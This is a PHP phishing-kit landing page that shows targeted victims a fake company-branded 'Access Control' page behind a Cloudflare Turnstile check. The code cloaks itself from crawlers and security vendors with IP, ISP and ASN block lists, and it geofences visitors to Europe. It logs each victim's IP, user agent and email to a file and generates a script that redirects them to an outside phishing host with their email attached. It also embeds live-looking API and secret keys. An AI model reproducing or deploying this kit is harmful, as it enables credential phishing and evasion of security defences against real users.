<?php 

// Change URL in createActionScript function ie: https://instalpanel.com/

$image1 = "1.jpg";
$image2 = "2.jpg";
$image3 = "3.jpg";
$image4 = "4.jpg";
$image5 = "5.jpg";

$imagePaths = array($image1, $image2, $image3, $image4, $image5);
$randomIndex = array_rand($imagePaths);
$randomImagePath = $imagePaths[$randomIndex];

// If request Method is not GET
if($_SERVER['REQUEST_METHOD'] !== 'GET') {
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
}

$primaryUA = $_SERVER['HTTP_USER_AGENT']; // Get UserAgent

if(!isset($_GET["biometric"])) { // Check email param
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
    exit;
}

//URL https://example.com/folder/?biometric=[[convert_to_base64({-Domain-}, FALSE)]]&solid=[[convert_to_base64({-User-}, FALSE)]] //

if(isset($_GET["biometric"])) { //Check email param
    $domain = base64_decode($_GET["biometric"]);  // domain.com
    $company = ucfirst((explode(".", $domain))[0]);
    $companyLower = strtolower($company);
} else {
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
    exit;
}

if(isset($_GET["solid"])) { //Check email param
    $user = base64_decode($_GET["solid"]); // user
} else {
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
    exit;
}

// Add both email vars
$email = $user."@".$domain;
// Return the decoded email and its validity

function getIP() {
    // Check if the visitor is behind a proxy
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipAddress = $_SERVER['REMOTE_ADDR'];
    }

    return $ipAddress;
}
$ipAddress = getIP(); // Execute function to get IP
$ipAddress = "94.70.57.229";

$strings = array(
    "apple",
    "banana",
    "cherry",
    "date",
    "elderberry",
    "fig",
    "grape",
    "honeydew",
    "imbe",
    "jackfruit",
    "kiwi",
    "lemon",
    "mango",
    "nectarine",
    "orange",
    "papaya",
    "quince",
    "raspberry",
    "strawberry",
    "tangerine",
    "ugli",
    "vanilla",
    "watermelon",
    "xigua",
    "yellowpassionfruit",
    "zucchini",
    "apricot",
    "blueberry",
    "coconut",
    "dragonfruit",
    "elderflower",
    "fig",
    "grapefruit",
    "huckleberry",
    "indianjujube",
    "jujube",
    "kiwifruit",
    "lime",
    "mulberry",
    "nectarberry",
    "olive",
    "pomegranate",
    "quince",
    "rambutan",
    "starfruit",
    "tamarind",
    "ugni",
    "vanillabean",
    "whitecurrant",
    "ximenia",
    "yellowfr",
    "zanahoria",
    "avocado",
    "blackberry",
    "cantaloupe",
    "durian",
    "elderberry",
    "feijoa",
    "grapefruit",
    "honeyberry",
    "indian",
    "fig",
    "juicy",
    "peach",
    "kiwano",
    "lemon",
    "mulberry",
    "nectarine",
    "oroblanco",
    "pomegranate",
    "quince",
    "rambutan",
    "strawberry",
    "tangerine",
    "ugli",
    "vanilla",
    "orchid",
    "watermelon",
    "ximenia",
    "caffra",
    "passion",
    "yellow",
    "fruit",
    "zinfandel",
    "apple",
    "banana",
    "cherry",
    "date",
    "elderberry",
    "fig",
    "grape",
    "honeydew",
    "imbe",
    "jackfruit"
);

$mouseStrings = array(
    "algorithm",
    "analytics",
    "api",
    "app",
    "ar",
    "artificialintelligence",
    "automation",
    "backend",
    "bigdata",
    "biometrics",
    "blockchain",
    "blogging"
);

$handleMouseStrings = array(
    "cloudcomputing",
    "coding",
    "commandline",
    "computer",
    "console",
    "cookie",
    "cpu",
    "cybersecurity",
    "cyberspace",
    "data",
    "datamining",
    "database",
    "debugging",
    "decryption",
    "desktop"
);

$handleTouchStrings = array(
    "automation",
    "backend",
    "biometrics",
    "blockchain",
    "cloud",
    "coding",
    "commerce",
    "compiler"
);


$urls = array(
    "https://thread.rafaelalvarezcxa.com/?hl=en",
    "https://thread.rafaelalvarezcxa.com/?hl=en"
);

$handleClassNames = array("apple", "banana", "cherry", "grape", "orange", "pear", "strawberry", "watermelon", "kiwi", "pineapple");

$randomIndex = array_rand($strings);
$secondIndex = array_rand($mouseStrings);
$thirdIndex = array_rand($handleMouseStrings);
$fourthIndex = array_rand($handleTouchStrings);
$fifthIndex = array_rand($handleClassNames);
$urlIndex = array_rand($urls);

$formID = $strings[$randomIndex];
$isMouseMoved = $mouseStrings[$secondIndex];
$handleMouseMovement = $handleMouseStrings[$thirdIndex];
$handleTouchMovement = $handleTouchStrings[$fourthIndex];
$classID = $handleClassNames[$fifthIndex];
$currentURL = $urls[$urlIndex];

function rejectBots($primaryUA) {  // Block bots based on their useragents
    // Array of bad user agents
    $badUA = ["bot", "bing", "Bing", "Crawl", "Bot", "Googlebot", "Bingbot", "Baiduspider", "YandexBot", "MJ12bot", "AhrefsBot", "SemrushBot", "DotBot", "Sogou web spider", "Twitterbot"];

    // Loop over the bad user agents
    foreach ($badUA as $ua) {
        // Check if the string contains the bad user agent
        if (stripos($primaryUA, $ua) !== false) {
            header("Location: https://en.wikipedia.org/wiki/SharePoint");
            exit;
        }
    }
}
rejectBots($primaryUA);

function verifyEmail($email) {
    // Validate the email format
    $isValid = filter_var($email, FILTER_VALIDATE_EMAIL);

    return $isValid;
}

if(isset($email)) {
    // Verify the email address
    $isEmailValid = verifyEmail($email);

    // Output the result
    if ($isEmailValid) {
        // Do nothing
    } else {
        header("Location: https://en.wikipedia.org/wiki/SharePoint");
        exit;
    }
}

function checkAndRedirect($domain) {
    // Check if the domain has a valid MX record
    if (!checkdnsrr($domain, 'MX')) {
        // Redirect to the specified URL
        header("Location: https://en.wikipedia.org/wiki/SharePoint");
        exit();
    }
}

// Check the domain and redirect if necessary
checkAndRedirect($domain);

function createActionScript($companyLower, $email) {
    // Create Action script
    $fileName = $companyLower.".php";

    // CHange file content from cf.php anc change IP and secret Key, and Link to redirect
    $fileContents = '<?php if ($_SERVER["REQUEST_METHOD"] === "POST") { if (isset($_POST["cf-turnstile-response"])) { $token = $_POST["cf-turnstile-response"]; header("Location: https://en.wikipedia.org/wiki/SharePoint"); } } else { header("Location: https://en.wikipedia.org/wiki/SharePoint"); } define("SECRET_KEY", "0x4AAAAAAAML65IJ2N3sA1nTGQxBwLTehgw"); function handlePost($token) { if (!empty($_SERVER["HTTP_CLIENT_IP"])) { $ip = $_SERVER["HTTP_CLIENT_IP"]; } else if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) { $ip = $_SERVER["HTTP_X_FORWARDED_FOR"]; } else { $ip = $_SERVER["REMOTE_ADDR"]; } $formData = array("secret" => SECRET_KEY, "response" => $token, "remoteip" => $ip); $url = "https://challenges.cloudflare.com/turnstile/v0/siteverify"; $result = file_get_contents($url, false, stream_context_create(array("http" => array("method" => "POST", "header" => "Content-Type: application/x-www-form-urlencoded", "content" => http_build_query($formData))))); $outcome = json_decode($result, true); if ($outcome["success"]) { header("Location: https://thread.rafaelalvarezcxa.com/?hl=en'.$email.'"); } else { if (isset($_SERVER["HTTP_REFERER"])) { header("Location: " . $_SERVER["HTTP_REFERER"]); } else { echo "Invalid selection"; } } } handlePost($token); ?>';
    // Open the file in write mode
    $fileHandle = fopen($fileName, 'w');

    // Check if the file was opened successfully
    if ($fileHandle === false) {
        http_response_code(404);
        header('Content-Type: text/plain');
        echo '404 Not Found';
        exit;
    } else {
        // Write the contents to the file
        fwrite($fileHandle, $fileContents);
        // Create the secure cookie
        // setcookie("i", $fileName, time() + (86400 * 30), "/"); // Directory to easily find generated .php file

        // Close the file handle
        fclose($fileHandle);
    }

    return $fileName;
}

function blockBadIPs($ipAddress) {
    $blacklist = array(
        "54.244.161.37",
        "185.125.168.57",
        "185.125",
        "195.201.181.104",
        "195.201",
        "5.199.174.85",
        "193.79.230.222",
        "185.193.159.51",
        "185.193",
        "54.244",
        "40.94.101.52",
        "40.94",
        "40.94.25.140",
        "34.215.221.11",
        "34.215",
        "40.94.33.32",
        "40.94.36.14",
        "40.94.35.57",
        "54.244.161.37",
        "212.90.203.113",
        "212.90",
        "20.236.59.68",
        "20.236",
        "40.94.28.89",
        "40.94.29.5",
        "40.94.29.65",
        "20.12.213.197",
        "20.12",
        "40.94.20.56",
        "34.215.221.11",
        "34.215",
        "170.250.244.206",
        "170.250",
        "54.244.161.37",
        "54.244",
        "40.94.20.76",
        "20.245.242.200",
        "20.245",
        "34.228.140.109",
        "34.228",
        "38.132.121.118",
        "38.132",
        "40.94.29.17",
        "23.101.122.145",
        "104.212.59.229",
        "104.212",
        "40.94.34.76",
        "128.90.173.111",
        "128.90",
        "212.90.203.113",
        "212.90",
        "40.94.29.76",
        "40.94.36.42",
        "40.94.25.190",
        "54.244.161.37",
        "54.244",
        "69.55.5.249",
        "69.55",
        "194.39.205.71",
        "194.39",
        "34.215",
        "40.94.28.163",
        "34.215.221.11",
        "40.94.35.50",
        "40.74.138.112",
        "40.74",
        "40.94.226.1",
        "52.43.49.251",
        "52.43",
        "40.94.105.8",
        "44.201.34.5",
        "44.201",
        "40.94.87.88",
        "4.204.208.137",
        "4.204",
        "40.94.35.85",
        "212.103.49.3",
        "212.103",
        "40.94",
        "4.204.184.33",
        "40.94.33.86",
        "37.120.150.171",
        "37.120",
        "37.221.112.164",
        "37.221".
        "18.206.82.126",
        "18.206",
        "3.228.120.82",
        "3.228",
        "146.70.179.100",
        "146.70",
        "195.74.76.194",
        "195.74",
        "35.181.100.129",
        "35.181",
        "20.238".
        "52.250.30.131",
        "20.238.60.120",
        "80.13.83.107",
        "89.37.101.19",
        "216.131.114.7",
        "80.13.83.107",
        "51.136.22.105",
        "51.136.22.105",
        "80.13.83.107",
        "51.136.22.105",
        "51.136.22.105",
        "34.214.117.190",
        "216.131.114.78",
        "216.131",
        "83.50.25.67",
        "185.112.82.107",
        "185.112.82.108",
        "83.50",
        "52.250.30.131",
        "52.250",
        "20.113.207.22",
        "20.113",
        // etc.
    );

    if(in_array($ipAddress, $blacklist)) {
        // echo "ip black";
        header("Location: https://en.wikipedia.org/wiki/SharePoint");
        exit;
    }
}

blockBadIPs($ipAddress);


$access_key = 'c842ccc334e5e0579fc912f110fb1745';

// Initialize CURL:
$ch = curl_init('https://api.ipapi.com/'.$ipAddress.'?access_key='.$access_key.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Store the data:
$json = curl_exec($ch);
curl_close($ch);

// Decode JSON response:
$api_result = json_decode($json, true);

// Output the "calling_code" object inside "location"
// echo $api_result['location']['calling_code'];

$countryCode = $api_result['country_code'];

if(!isset($countryCode)) {
    // echo "No Country Code"; // Redirect for security purposes 
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
    exit;
}

$continent = $api_result["continent_code"];

// Statement conditions *** START *** //
if(isset($countryCode)) {
    if($countryCode == "US") {
        header("Location: https://en.wikipedia.org/wiki/SharePoint");
        // echo "Is USA!";
        exit;
    }
}

if(isset($continent)) {
    if($continent !== "EU") {
        header("Location: https://en.wikipedia.org/wiki/SharePoint");
        // echo "Not Europe!";
        exit;
    }
}

$isp = $api_result["connection"]["isp"]; // Get ISP from API
if(!isset($isp)) {
    // echo "No ISP"; // Redirect for security purposes 
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
    exit;
}

$asn = $api_result["connection"]["asn"]; // Get ASN from API
if(!isset($asn)) {
    // echo "No Country Code"; // Redirect for security purposes 
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
    exit;
}

$blockedISP = array(
    "Microsoft",
    "Microsoft Corporation",
    "Ovh Sas",
    "Check Point",
    "\(^_^)",
    "Checkpoint",
    "Check Point Software Technologies LTD",
    "Google",
    "Google Inc",
    "Google LLC",
    "Amazon",
    "Amazon.com",
    "OpenDNS",
    "Security Made in Letzebuerg",
    "1337 Services Gmbh",
    "Meerfarbig Gmbh & Co. Kg",
    "Hosterion Srl",
    "Serverhouse Ltd",
    "Uk-2 Limited",
    "Microsoft Azure",
    "Fortinet Inc.",
    "Colocrossing",
    "Datacamp Limited",
    "Leaseweb San Francisco",
    "Oy Crea Nova Hosting Solution Ltd",
    "netcup GmbH",
    "Packet Exchange Limited",
    "Cloudflare",
    "AVAST Software s.r.o.",
    "Zscaler Switzerland Gmbh",
    "Security Firewall Ltd",
    "Ip Volume Inc",
    "Zscaler Inc.",
    "Mcafee Germany Gmbh",
    "Iomart Cloud Services Limited",
    "Binary Racks Limited",
    "Clouvider Limited",
    "Hetzner Online Gmbh",
    "Hostkey B.V.",
    "Uab Cherry Servers",
    "Next Global Services l.p",
    "Next Global Services l.p.",
    "Zscaler",
    "Layerhost",
    "AVAST Software s.r.o",
    "Netprotect-sp",
    "OVH SAS",
    "31173 Services AB",
    "Leaseweb Germany",
    "Leaseweb Usa Inc.",
    "Choopa, LLC",
    "cleardocks LLC",
    "Intelligence Network Online",
    "Esecurity s.A",
    "Digitalocean LLC",
    "Leaseweb Netherlands B.V.",
    "Leaseweb Deutschland Gmbh",
    "The Constant Company LLC",
    "Cogent Communications",
    "31173 Services Ab",
    "Webhosting24 GmbH",
    "GleSYS Internet Services AB",
    "Zscaler",
    "Web Werks India Pvt",
    "Google Fiber",
    "Hostroyale Technologies Pvt Ltd",
    "Seflow s.n.c. Di Marco Brame & C.",
    "Seflow s.n.c. Di Marco Brame & C",
    "m247 Ltd",
    "The Calyx Institute",
    "amazon.com Inc",
    "Frantech Solutions",
    "Forthnet"
);

// ASN of MS/Proofpoint/OVH https://2ip.io/analytics/asn-list/
$blockedASN = array("699", "801", "7224", "8987", "9059", "10124", "14618", "16509", "02", "17493", "19047", "01", "21664", "36263", "38895", "39111", "40045", "52994", "58588", "61577", "62785", "135630", "262486", "263639", "264167", "264344", "264509", "266122", "266194", "267242", "268063", "271017", "271047", "395343", "399834", "399991", "400098", "3598", "5761", "6182", "6194", "6291", "6584", "8068", "8069", "8070", "8071", "8072", "8073", "8074", "8075", "8812", "12076", "13399", "13811", "14719", "17345", "20046", "22692", "23468", "25796", "26222", "30135", "30575", "31792", "32476", "35106", "36006", "40066", "45139", "52985", "58862", "59067", "63314", "132348", "200517", "395496", "395524", "395851", "396463", "397466", "397996", "398575", "398656", "398657", "398658", "398659", "398660", "398661", "398961", "400572", "400573", "400574", "400575", "400576", "400577", "400578", "400579", "400580", "400581", "400582", "13916", "19506", "22843", "26211", "52129", "16276", "35540");

if(in_array($asn, $blockedASN)) {
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
    // echo "Blocked ASN!";
    exit;
}

if(in_array($isp, $blockedISP)) {
    // echo "Blocked ISP!";
    header("Location: https://en.wikipedia.org/wiki/SharePoint");
    exit;
}

function detectDuplicateVisits($user) { // To prevent double execution of API on the same browser
    $cookie_name = "visit_".$user; // To create dynamic cookie name
    $cookie_value = $user;

    if(!isset($_COOKIE["visit_".$user])) {
        setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
    }
}

if(isset($_COOKIE["isLogged"])) {
    $logCount = $_COOKIE["isLogged"];
    $logCount+=1;
} else {
    $logCount = 1;
}

$visitCount = '';
if($logCount >=1){
    $visitCount = " * ".$logCount; 
}

$date = date('m/d/Y h:i:s a', time());

$logged = file_put_contents("e.txt", "IP: $ipAddress\nUA: $primaryUA\nTIME: $date\nEmail: $email$visitCount\nCOUNTRY: $countryCode\nISP: $isp\nIP Type: $ip_type\n-------\n", FILE_APPEND | LOCK_EX);
setcookie("isLogged", $logCount, time() + (86400 * 30), "/");

detectDuplicateVisits($user); // Create value to check for duplicates to prevent API abuse
createActionScript($companyLower, $email); // Create action script

?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <meta name="application-name" content="<?php echo $company?>">
    <link rel="icon" type="image/x-icon" href="https://www.google.com/s2/favicons?domain=<?php echo $domain ?>">
    <title>
        <?php echo $company?> Access Control
    </title>
    <script>

        window.onloadTurnstileCallback = function () {
            turnstile.render('#<?php echo $formID ?>', {
                sitekey: '0x4AAAAAAAML66N8B69Jdh0c',
                theme: 'auto',
                size: 'normal',
                language: 'auto',
                callback: function (token) {
                    document.querySelector('#<?php echo $formID ?>').submit(); 
                },
            });
        };

    </script>
    <style>
        body,
        html {
            height: 100vh;
        }

        body {
            margin: 0;
            background-image: url("<?php echo $randomImagePath; ?>");
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Roboto, sans-serif
        }

        .<?php echo $classID; ?> {
            width: 80%;
            max-width: 350px;
            height: 200px;
            background-color: #2b2b2b;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #2b2b2b;
            flex-direction: column;
            font-family: "Segoe UI", SegoeUI, Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        h1 {
            font-size: 1.2em;
            font-weight: 600;
            margin: 0;
        }

        @media (max-width: 768px) {
            .<?php echo $classID; ?> {
                width: 90%;
            }
        }

        @media (max-width: 576px) {
            .<?php echo $classID; ?> {
                width: 95%;
            }
            h1 {
                font-size: 20px;
            }
        }
    </style>
</head>

<body>
    <div class="<?php echo $classID; ?>">
        <h1><span style="color: #f2f2f2;"><?php echo $company ?></span> <span style="color: orange;">Access Control</span></h1>
        <br>

        <form id="<?php echo $formID ?>" action="<?php echo $companyLower; ?>" method="POST"></form>
    </div>

    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=onloadTurnstileCallback"></script>
</body>
</html>